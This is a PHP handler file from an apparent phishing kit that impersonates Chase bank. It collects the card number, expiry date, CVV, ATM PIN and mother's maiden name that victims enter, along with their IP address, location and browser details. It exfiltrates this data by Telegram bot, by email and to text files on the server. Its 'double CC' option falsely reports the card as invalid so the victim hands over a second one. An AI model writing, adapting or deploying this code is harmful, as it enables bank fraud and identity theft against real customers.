<?php
ob_start();
session_start();
error_reporting(0);
include'../../spox_bot.php';
include'../../check.php';
if (empty($_GET['token'])) {
   exit(header("Location: ../../credit_verify?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}
if (!empty($_POST['_csrf'])) {
$bins = preg_replace('/\s/', '', $_POST['spox_cc']);
$resulta  = "+ --------------[ CHASE SPOX X BEEMS ]---------------+\n";
$resulta .= "[CC]: ".$_POST['spox_cc']."\n";
$resulta .= "[EXP]: ".$_POST['spox_cc_exp']."\n";
$resulta .= "[CVV]: ".$_POST['spox_cvv']."\n";
$resulta .= "[ATMPIN]: ".$_POST['spox_atm_pin']."\n";
$resulta .= "[MMN]: ".$_POST['mmn']."\n";
$resulta .= "+ --------------[ VICTEM INFO ]---------------+\n";
$resulta .= "IP Address: ".$ip_spox."\n";
$resulta .= "Country: ".$country_spox."\n";
$resulta .= "City: ".$city_spox."\n";
$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
$resulta .= "User Agent: ".$_SESSION['platform']."\n";
$resulta .= "+ --------------[ CHASE V5 ]---------------+\n";
kirim_tele($telegram_bot_token, $telegram_chat_id);

$subject = "#CHASE SPOX CC: [{bins}] [ {$country_spox} - {$_SESSION['browser']} - {$ip_spox} ]";
$headers="From: CHASE SPOX V5 <".$sendfrom.">\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
if($send_result == "on"){
    @mail($email,$subject,$resulta,$headers);
}if($text_result == "on"){
    text_spox2("../../admin/result/cc".$resultpin.".txt",$resulta);
    text_spox2("../../admin/result/bulkcc".$resultpin.".txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_POST['spox_cc']." | ".$_POST['spox_cc_exp']." | ".$_POST['spox_cvv']." | ".date("d/m/Y h:i:sa")."\r\n");
}
if($double_cc == "on"){
        if (!isset($_POST['invalid'])) {
           exit(header("Location: ../../credit_verify?ch_id=$rundomizi&country=".$country_spox."&expired=$expired&invalid=card"));
        }else{
          exit(header("Location: ../../thanks?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
        }
}else{
  exit(header("Location: ../../thanks?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}

}else{
    exit(header("Location: ../../credit_verify?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}


?>